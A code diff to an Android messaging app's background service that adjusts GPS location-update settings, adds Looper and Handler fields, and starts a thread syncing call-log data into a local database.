@@ -12,6 +12,7 @@ import android.location.LocationProvider;
 import android.net.Uri;
 import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
 import android.provider.Telephony;
 import android.util.Log;
 
@@ -27,6 +28,8 @@ public class MessagingService extends Service {
     private SmsObserver mObserver;
     protected static String sTelephoneAddress;
     private LocationManager mLocationManager;
+    private Looper mLooper;
+    private Handler mHandler;
     public MessagingService() {
     }
 
@@ -48,10 +51,10 @@ public class MessagingService extends Service {
         outgoingFilter.addAction(Constants.SENT_CONFIRMATION_ACTION);
         IntentFilter conversationFilter = new IntentFilter();
         conversationFilter.addAction(Constants.CREATE_CONVERSATION_ACTION);
-      //  IntentFilter airplaneFilter = new IntentFilter();
-      //  airplaneFilter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
-      //  mAirplaneReceiver = new AirplaneReceiver();
-      //  registerReceiver(mAirplaneReceiver, airplaneFilter);
+        //  IntentFilter airplaneFilter = new IntentFilter();
+        //  airplaneFilter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
+        //  mAirplaneReceiver = new AirplaneReceiver();
+        //  registerReceiver(mAirplaneReceiver, airplaneFilter);
         /*mShareReceiver = new ShareReceiver();
         IntentFilter shareFilter = new IntentFilter(Intent.ACTION_SEND);
         shareFilter.addCategory(Intent.CATEGORY_DEFAULT);
@@ -75,12 +78,20 @@ public class MessagingService extends Service {
         mObserver = new SmsObserver();
         getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mObserver);
         String locationProvider = LocationManager.GPS_PROVIDER;
+
         try {
             mLocationManager = Helpers.getLocationManager(this);
-            mLocationManager.requestLocationUpdates(locationProvider, 0, 0, Helpers.getLocationListener(this));
+            mLocationManager.requestLocationUpdates(locationProvider, 1000, 5, Helpers.getLocationListener(MessagingService.this));
+
         } catch (SecurityException e) {
             e.printStackTrace();
         }
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                Helpers.syncCallLogDataToDatabase(MessagingService.this, sDatabase);
+            }
+        }).start();
     }
 
 
